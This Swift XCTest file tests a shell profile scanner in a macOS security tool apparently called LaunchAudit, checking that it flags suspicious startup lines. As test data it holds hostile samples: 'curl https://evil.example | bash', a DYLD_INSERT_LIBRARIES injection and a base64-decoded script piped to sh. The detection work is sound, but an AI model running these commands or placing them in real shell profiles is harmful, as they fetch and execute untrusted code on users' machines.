import XCTest
@testable import LaunchAudit

final class ShellProfileScannerTests: XCTestCase {

    func testScannerCategory() {
        let scanner = ShellProfileScanner()
        XCTAssertEqual(scanner.category, .shellProfiles)
    }

    func testScanCompletesQuickly() async throws {
        // Even with all shell profiles populated, the combined-regex scan
        // should be near-instant.
        let scanner = ShellProfileScanner()
        let start = Date()
        _ = try await scanner.scan()
        let elapsed = Date().timeIntervalSince(start)
        XCTAssertLessThan(elapsed, 2.0)
    }

    // MARK: - Detection of suspicious patterns

    func testDetectsCurlPipeBash() {
        let content = "alias install='curl https://evil.example | bash'"
        let reasons = ShellProfileScanner.suspiciousReasons(in: content)
        XCTAssertFalse(reasons.isEmpty,
            "Should flag curl | bash pattern")
    }

    func testDetectsDyldInjection() {
        let content = "export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib"
        let reasons = ShellProfileScanner.suspiciousReasons(in: content)
        XCTAssertTrue(reasons.contains { $0.contains("Dynamic library") })
    }

    func testDetectsBase64Decode() {
        let content = "echo 'aGVsbG8=' | base64 --decode | sh"
        let reasons = ShellProfileScanner.suspiciousReasons(in: content)
        XCTAssertTrue(reasons.contains { $0.contains("Base64") })
    }

    func testCleanContentReturnsNoReasons() {
        let content = """
        # Helpful comment
        export PATH=/usr/local/bin:$PATH
        alias ll='ls -la'
        """
        let reasons = ShellProfileScanner.suspiciousReasons(in: content)
        XCTAssertTrue(reasons.isEmpty,
            "Clean profile content should produce no risk reasons")
    }

    func testMultipleMatchesReportsAllReasons() {
        let content = """
        export DYLD_INSERT_LIBRARIES=/tmp/x.dylib
        curl https://x.example | bash
        """
        let reasons = ShellProfileScanner.suspiciousReasons(in: content)
        XCTAssertGreaterThanOrEqual(reasons.count, 2,
            "Multiple matches should produce multiple distinct reasons")
    }
}
